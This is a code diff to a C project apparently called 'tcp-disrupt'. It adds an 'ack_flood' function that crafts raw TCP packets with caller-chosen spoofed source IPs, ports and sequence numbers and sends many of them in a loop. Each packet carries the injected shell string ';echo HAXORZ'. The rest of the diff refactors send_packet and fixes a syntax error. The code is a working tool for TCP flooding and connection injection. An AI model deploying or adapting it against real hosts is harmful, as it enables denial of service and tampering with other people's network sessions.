@@ -1,14 +1,44 @@
 #include "tcp-disrupt.h"
 
-void send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
+bool ack_flood(     char *srcIP,
+                    char *dstIP,
+                    u_int16_t dstPort,
+                    u_int16_t srcPort,
+                    u_int32_t seq,
+                    u_int32_t ack_seq,
+                    int n,
+                    int socket_fd,
+                    struct sockaddr_in addr_in) {
+
+    const char * data = ";echo HAXORZ";
+    int data_len = strlen(data);
+    int packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr) + data_len;
+    char *packet = (char *) malloc(packet_size);
+    struct tcphdr *tcpHdr = (struct tcphdr*) (packet + sizeof(struct iphdr));
+
+    fill_packet(srcIP, dstIP, dstPort, srcPort, 0, 0, seq, ack_seq, data, packet, packet_size);
+
+    int i;
+    bool b = true;
+    for (i = 0; i < n && b; ++i) {
+        b = send_packet(socket_fd, packet, addr_in);
+        tcpHdr->seq = htonl(seq + i);
+    }
+
+    free(packet);
+
+    return b;
+}
+
+bool send_packet(int socket_fd, char *packet, struct sockaddr_in addr_in) {
     int bytes;
     struct iphdr *ipHdr = (struct iphdr *) packet;
 
-    if((bytes = sendto(socket_fd, ipHdr, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {
-        perror("Error on sendto()");
+    if((bytes = sendto(socket_fd, ipHdr, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {        
+        return false;
     }
-    else {
-        printf("\nSuccess! Sent %d bytes.\n", bytes);
+    else {        
+        return true;
     }
 }
 
@@ -148,7 +178,7 @@ char* gen_packet(   char *srcIP,
                     uint32_t packet_size) {
 
 
-        char * packet = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
+        char * packet = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data));
         fill_packet(srcIP, dstIP, dstPort, srcPort, syn, ack, seq, ack_seq, data, packet, packet_size);
         return packet;
 }
